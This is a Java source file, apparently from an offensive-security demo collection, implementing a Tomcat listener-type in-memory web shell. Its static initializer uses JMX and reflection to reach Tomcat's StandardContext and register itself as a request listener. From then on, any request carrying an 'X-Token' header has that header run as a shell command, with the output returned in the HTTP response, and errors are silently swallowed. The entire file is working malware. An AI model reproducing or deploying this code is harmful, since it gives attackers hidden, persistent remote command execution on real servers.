package com.demo.memshell;

import com.sun.jmx.mbeanserver.NamedObject;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.util.Set;

/**
 * @author Whoopsunix
 * JMX 获取 StandardContext 注入 Tomcat Listener 型内存马
 * Tomcat 7 8 9
 */
public class TomcatListenerJMXMS implements ServletRequestListener {
    public TomcatListenerJMXMS() {

    }

    static {
        try {
            javax.management.MBeanServer mbeanServer = ManagementFactory.getPlatformMBeanServer();
//            javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (com.sun.jmx.interceptor.DefaultMBeanServerInterceptor) getFieldValue(mbeanServer, "mbsInterceptor");
            com.sun.jmx.mbeanserver.Repository repository = (com.sun.jmx.mbeanserver.Repository) getFieldValue(defaultMBeanServerInterceptor, "repository");
            Set<NamedObject> objectSet = repository.query(new javax.management.ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot 中是 Tomcat
                objectSet = repository.query(new javax.management.ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }
            for (com.sun.jmx.mbeanserver.NamedObject namedObject : objectSet) {
                javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
                org.apache.catalina.authenticator.AuthenticatorBase authenticatorBase = (org.apache.catalina.authenticator.AuthenticatorBase) getFieldValue(dynamicMBean, "resource");
                org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(authenticatorBase, "context");
                TomcatListenerJMXMS listenerMemShell = new TomcatListenerJMXMS();
                standardContext.addApplicationEventListener(listenerMemShell);
            }
        } catch (Exception e) {
        }
    }


    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
            String header = httpServletRequest.getHeader("X-Token");
            if (header == null) {
                return;
            }
            String result = exec(header);
            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
            PrintWriter printWriter = request.getResponse().getWriter();
            printWriter.println("TomcatListenerJMXMS injected");
            printWriter.println(result);
        } catch (Exception e) {

        }

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
